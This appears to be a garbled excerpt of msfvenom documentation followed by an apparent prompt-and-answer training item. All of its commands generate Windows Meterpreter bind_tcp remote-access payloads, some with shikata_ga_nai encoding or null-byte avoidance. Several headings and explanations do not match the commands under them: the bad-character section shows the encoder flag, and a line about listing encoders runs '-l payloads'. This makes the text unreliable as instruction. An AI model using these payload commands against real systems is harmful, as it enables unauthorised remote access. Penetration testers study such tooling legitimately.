# How to avoid bad characters
The -b flag is meant to be used to avoid certain characters in the payload. When this option is used, msfvenom will automatically find a suitable encoder to encode the payload:
```
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 
```

# How to encode a payload
By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following:
```
./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
```

To find out what encoders you can use, you can use the -l flag:
To start using msfvenom, first please take a look at the options it supports:
```
./msfvenom -l payloads
```

# How to generate a payload
To see what payloads are available from Framework, you can do:
```
./msfvenom -p windows/meterpreter/bind_tcp -f exe
```

The -p flag also supports "-" as a way to accept a custom payload:
```
./msfvenom --help-formats
```

Syntax example:

 Question: Generate an msfvenom command to create a bind TCP payload for Windows in raw format. The payload should avoid null bytes as bad characters (-b '\x00'). Respond only with the msfvenom command, without any additional explanations or text. 

 Your response: 
```
./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
```
